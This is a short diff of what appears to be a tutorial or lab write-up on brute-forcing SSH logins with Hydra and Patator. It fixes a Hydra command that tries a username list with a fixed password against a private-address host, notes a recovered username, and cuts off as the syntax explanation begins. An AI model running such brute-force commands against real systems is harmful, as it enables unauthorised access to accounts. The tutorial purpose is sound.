@@ -1,6 +1,6 @@
 Brute forcing SSH with Hydra + Patator
 
-hydra -L 9_letter_user.txt -p '1qaz%40WSX\' ssh://10.10.54.147 -t 4 -V -f  // tommyboy1
+hydra -L 9_letter_user.txt -p '1qaz%40WSX' ssh://10.10.54.147 -t 4 -V -f  // tommyboy1
 
 People who have used Hydra will be familiar with the syntax here, but for those who aren't, let's break it down:
  
